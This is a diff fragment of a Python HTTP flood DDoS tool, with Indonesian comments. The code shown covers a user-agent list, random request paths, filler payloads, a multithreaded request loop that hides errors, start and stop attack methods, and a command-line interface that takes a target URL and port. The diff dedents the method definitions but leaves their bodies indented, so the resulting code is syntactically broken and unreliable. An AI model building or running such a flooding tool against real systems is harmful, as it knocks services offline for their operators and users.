@@ -6281,8 +6281,7 @@ class HTTPFloodDDoS:
             "Waterstones/5.0.0",
             "Blackwell's/5.0.",
         ]
-        
-        def generate_random_path(self):
+def generate_random_path(self):
         # Generate random path untuk membuat request lebih bervariasi
         if not self.paths:
             # Default paths jika tidak ada yang diset
@@ -6292,13 +6291,13 @@ class HTTPFloodDDoS:
             ])
         return random.choice(self.paths)
     
-       def generate_payload(self):
+def generate_payload(self):
         # Generate payload jika diperlukan
         if self.payload_size > 0:
             return 'A' * self.payload_size
         return None
     
-       def make_request(self):
+def make_request(self):
         # Fungsi untuk membuat HTTP request
         while self.running:
             try:
@@ -6350,7 +6349,7 @@ class HTTPFloodDDoS:
                 # Tangani exception tanpa mencetak error untuk mengurangi output
                 pass
     
-        def start_attack(self, num_threads):
+def start_attack(self, num_threads):
         # Metode untuk memulai serangan
         self.running = True
         print(f"[*] Starting attack with {num_threads} threads...")
@@ -6377,14 +6376,14 @@ class HTTPFloodDDoS:
         self.stop_attack()
         print("[*] Attack completed!")
     
-       def stop_attack(self):
+def stop_attack(self):
         # Metode untuk menghentikan serangan
         self.running = False
         if self.executor:
             self.executor.shutdown(wait=False)
             self.executor = None
 
-    def main():
+def main():
     parser = argparse.ArgumentParser(description='HTTP Flood DDoS Tool')
     parser.add_argument('--target', required=True, help='Target URL/IP')
     parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
